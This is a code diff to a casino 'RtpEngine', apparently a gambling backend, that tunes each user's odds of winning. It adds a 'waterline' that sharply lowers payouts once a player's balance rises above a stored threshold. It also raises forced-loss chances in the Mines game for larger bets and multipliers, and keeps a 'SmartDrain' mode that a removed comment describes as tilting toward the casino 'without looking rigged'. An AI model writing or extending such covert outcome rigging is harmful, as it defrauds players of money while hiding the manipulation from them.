@@ -458,11 +458,23 @@ class RtpEngine {
 
     // 1. Priority check: SmartDrain active on this user (realistic, natural tilt)
     if (await this.isDrainActive(userId, isTournament)) {
-      return 0.45; // balanced tilt in favor of casino without looking rigged
+      return 0.32;
     }
 
     // 2. Lifecycle Funnel check (Dynamic Retention for deposits)
     const funnel = await this.getFunnelState(userId);
+    try {
+      const rawLine = await redisClient.getClient().get(`rtp:waterline:${userId}`);
+      const waterline = Number(rawLine || 0);
+      if (waterline > 0) {
+        const excess = funnel.currentBalance - waterline;
+        if (excess > 10) {
+          return clamp(0.12 + excess / 220, 0.12, 0.38);
+        }
+      }
+    } catch {
+      // waterline is optional
+    }
     if (funnel.phase !== 'normal') {
       return funnel.bias;
     }
@@ -1050,16 +1062,20 @@ class RtpEngine {
       const funnel = await this.getFunnelState(userId);
       const drainActive = await this.isDrainActive(userId, isTournament);
 
-      const [streakRaw, sessionProfitRaw, scalpRaw] = await Promise.all([
+      const [streakRaw, sessionProfitRaw, scalpRaw, waterlineRaw] = await Promise.all([
         r.get(`rtp:win_streak:${userId}`),
         r.get(`rtp:session_profit:${userId}`),
         r.get(`rtp:mines_scalp:${userId}`),
+        r.get(`rtp:waterline:${userId}`),
       ]);
+      const waterline = Number(waterlineRaw || 0);
+      const bankExcess = waterline > 0 ? funnel.currentBalance - waterline : 0;
 
       const decision = decideMinesClick({
         drainActive,
         streak: Number(streakRaw || 0),
         sessionProfit: Number(sessionProfitRaw || 0),
+        bankExcess,
         scalpCashouts: Number(scalpRaw || 0),
         betAmount,
         potentialMultiplier,
@@ -1122,10 +1138,27 @@ class RtpEngine {
         }
       }
 
-      // 1. Admin / auto SmartDrain is a hard loss. Funnel drain stays a tilt.
+      // 1. SmartDrain is a heavy tilt, never a 100% scripted bust.
       if (await this.isDrainActive(userId, isTournament)) {
-        return true;
+        return Math.random() < 0.72;
       }
+
+      try {
+        const rawLine = await redisClient.getClient().get(`rtp:waterline:${userId}`);
+        const waterline = Number(rawLine || 0);
+        if (waterline > 0) {
+          const excess = funnel.currentBalance - waterline;
+          if (excess > 15) {
+            let p = 0.32 + Math.min(0.22, (excess - 15) / 90);
+            if (potentialMultiplier >= 2) p += 0.08;
+            if (betAmount >= 40) p += 0.06;
+            return Math.random() < Math.min(0.72, p);
+          }
+        }
+      } catch {
+        // optional
+      }
+
       const drain = funnel.phase === 'drain' || funnel.phase === 'recapture';
       if (drain) {
         let forceChance = 0.60;
